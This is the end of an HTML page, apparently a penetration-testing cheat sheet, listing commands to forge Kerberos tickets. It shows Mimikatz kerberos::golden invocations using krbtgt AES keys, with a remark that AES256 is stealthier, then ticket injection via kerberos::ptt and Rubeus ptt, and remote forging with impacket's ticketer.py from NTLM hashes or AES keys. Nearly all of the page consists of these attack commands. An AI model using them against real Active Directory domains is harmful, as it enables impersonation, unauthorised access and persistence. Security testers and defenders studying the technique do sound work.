</span><span class="err">&gt;</span><span class="w"> </span><span class="n">kerberos::golden</span><span class="w"> </span><span class="nx">/domain:</span><span class="err">&lt;</span><span class="nx">domain_name</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/sid:</span><span class="err">&lt;</span><span class="nx">domain_sid</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/aes128:</span><span class="err">&lt;</span><span class="nx">krbtgt_aes128_key</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">user_name</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/service:</span><span class="err">&lt;</span><span class="nx">service_name</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/target:</span><span class="err">&lt;</span><span class="nx">service_machine_hostname</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># To generate the TGS with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)</span><span class="w">
</span><span class="err">&gt;</span><span class="w"> </span><span class="n">kerberos::golden</span><span class="w"> </span><span class="nx">/domain:</span><span class="err">&lt;</span><span class="nx">domain_name</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/sid:</span><span class="err">&lt;</span><span class="nx">domain_sid</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/aes256:</span><span class="err">&lt;</span><span class="nx">krbtgt_aes256_key</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">user_name</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/service:</span><span class="err">&lt;</span><span class="nx">service_name</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/target:</span><span class="err">&lt;</span><span class="nx">service_machine_hostname</span><span class="err">&gt;</span><span class="w"> 

</span><span class="c"># Inject TGS with Mimikatz</span><span class="w">
</span><span class="err">&gt;</span><span class="w"> </span><span class="n">kerberos::ptt</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">ticket_kirbi_file</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div></div>

<h3 id="rubeus-1">Rubeus</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; .\Rubeus.exe ptt /ticket:&lt;ticket_kirbi_file&gt;
</code></pre></div></div>

<h3 id="remote-1">Remote</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ticketer.py <span class="nt">-nthash</span> <span class="nv">$NTLM</span> <span class="nt">-domain-sid</span> <span class="nv">$DOMAIN_SID</span> <span class="nt">-domain</span> <span class="nv">$DOMAIN</span> &lt;USER&gt;

<span class="c"># To generate the TGS with NTLM</span>
<span class="nv">$ </span>python ticketer.py <span class="nt">-nthash</span> &lt;ntlm_hash&gt; <span class="nt">-domain-sid</span> &lt;domain_sid&gt; <span class="nt">-domain</span> &lt;domain_name&gt; <span class="nt">-spn</span> &lt;service_spn&gt;  &lt;user_name&gt;

<span class="c"># To generate the TGS with AES key</span>
<span class="nv">$ </span>python ticketer.py <span class="nt">-aesKey</span> &lt;aes_key&gt; <span class="nt">-domain-sid</span> &lt;domain_sid&gt; <span class="nt">-domain</span> &lt;domain_name&gt; <span class="nt">-spn</span> &lt;service_spn&gt;  &lt;user_name&gt;

<span class="c"># Set the ticket for impacket use</span>
<span class="nv">$ </span><span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>&lt;TGS_ccache_file&gt;
</code></pre></div></div>


      </section>
    </div>
  </body>
</html>